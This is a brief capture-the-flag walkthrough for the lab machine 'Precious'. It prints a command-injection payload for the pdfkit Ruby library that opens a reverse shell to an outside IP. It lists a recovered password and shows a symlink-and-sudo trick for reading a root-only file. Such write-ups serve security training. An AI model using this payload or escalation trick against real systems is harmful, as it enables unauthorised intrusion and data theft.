# Precious

## Analysis

- nmap scan reveals open ports `80` and `22`
  - ssh version `OpenSSH 8.4p1 Debian 5+deb11u1`
  - webserver running `nginx 1.18.0`
    - running ruby via `Phusion Passenger(R) 6.0.15`
    - redirects to `http://precious.htb/` -> add to host file
    - allows to provide a url which will be converted to a pdf
    - there is a vulnerable ruby package [pdfkit](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)
    - this can be used for RCE


## Solution

### User flag

- following input gives a reverse shell 
```
http://%20`bash -c 'bash -i >& /dev/tcp/10.10.16.50/1234 0>&1'
```
- found credentials for henry in `/home/ruby/.bundle/config`: `Q3c1AqGHtoI0aXAYFH`
- allows ssh login to obtain user flag

### Root flag

- user is allowed to run ruby script as root `/opt/update_dependencies.rb`
- this script reads `dependencies.yml` from current directory
- creating a symlink to `/root/root.txt` includes flag into error message:
```bash
ln -s /root/root.txt dependencies.yml
sudo /usr/bin/ruby /opt/update_dependencies.rb
```